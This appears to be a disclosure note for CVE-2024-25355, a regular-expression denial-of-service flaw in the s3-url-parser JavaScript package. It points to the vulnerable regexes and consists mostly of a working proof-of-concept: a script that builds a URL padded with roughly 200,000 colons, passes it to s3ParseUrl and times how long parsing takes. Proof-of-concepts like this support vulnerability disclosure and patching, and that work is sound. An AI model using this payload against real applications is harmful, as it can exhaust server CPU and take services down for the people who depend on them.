|  | CVE ID: CVE-2024-25355 |
|  |  |
|  | The regexes defined on lines 7. , 17. and 27. inside https://github.com/AntonioRecaldeRusso/s3-url-parser/blob/master/index.js |

|  |  |
|  | console.time('[ + ] Time passed -> '); |
|  |  |
|  | var payload = '/g ' + ':'.repeat(199999) + ':/' |
|  | const sampleUrl = "http://s3mamazonawsocom/" + payload; |
|  | const { bucket, region, key } = s3ParseUrl(sampleUrl); |
|  | console.log(sampleUrl); |
|  |  |
|  | console.timeEnd('[ + ] Time passed -> '); |
